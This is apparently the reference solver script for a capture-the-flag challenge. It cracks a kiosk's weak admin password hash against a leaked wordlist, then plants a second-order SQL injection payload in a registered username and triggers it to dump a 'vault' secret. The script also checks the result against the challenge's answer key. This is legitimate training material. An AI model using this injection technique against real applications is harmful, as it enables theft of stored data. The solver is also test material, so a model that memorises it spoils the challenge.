#!/usr/bin/env python3
"""M01 reference solver (participant-reproducible).

1. Reproduce the kiosk's custom hash to crack the weak admin password from the
   leaked wordlist.
2. Authenticate via `login` (proves the auth-layer understanding).
3. Register a username carrying a second-order SQLi payload.
4. Trigger `load` so the stored username is interpolated into the raw vault
   query and the flag secret leaks out.
"""
import hashlib
import re
import shutil
import sqlite3
import subprocess
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, r"d:\ctf\FLAG_THEFT_AUTO_FINAL\rebuild_workspace")
import lib_fta as L

SRC = L.out_dir("M01")
SALT = "GTA_SALT_v2"
PAYLOAD = "' UNION SELECT 1, secret FROM vault --"


def custom_hash(password: str, username: str) -> str:
    return hashlib.sha256((password + username[::-1] + SALT).encode()).hexdigest()[:16]


def _recover_admin_pw(db: Path) -> str:
    con = sqlite3.connect(db)
    target = con.execute("SELECT pw_hash FROM users WHERE username = 'admin'").fetchone()[0]
    con.close()
    for word in (SRC / "common_pw.txt").read_text(encoding="utf-8").split():
        if custom_hash(word, "admin") == target:
            return word
    raise AssertionError("admin password not found in common_pw.txt")


def solve() -> str:
    # Run against a throwaway copy so the shipped artifacts stay pristine.
    work = Path(tempfile.mkdtemp(prefix="m01_"))
    try:
        for name in ("fleeca.db", "fleeca_kiosk.py"):
            shutil.copy(SRC / name, work / name)
        admin_pw = _recover_admin_pw(work / "fleeca.db")

        def kiosk(*args):
            r = subprocess.run([sys.executable, str(work / "fleeca_kiosk.py"), *args],
                               capture_output=True, text=True)
            return r.stdout

        assert "welcome back" in kiosk("login", "admin", admin_pw), "auth layer not solved"
        kiosk("register", PAYLOAD, "x")
        out = kiosk("load", PAYLOAD)
        m = re.search(r"FTA\{[a-z0-9_]+\}", out)
        assert m, f"no flag leaked; kiosk output:\n{out}"
        return m.group(0)
    finally:
        shutil.rmtree(work, ignore_errors=True)


def check(candidate: str) -> None:
    assert candidate == L.FLAGS["M01"], f"wrong flag rejected: {candidate!r}"


if __name__ == "__main__":
    flag = solve()
    check(flag)
    print("[M01] PASS ->", flag)
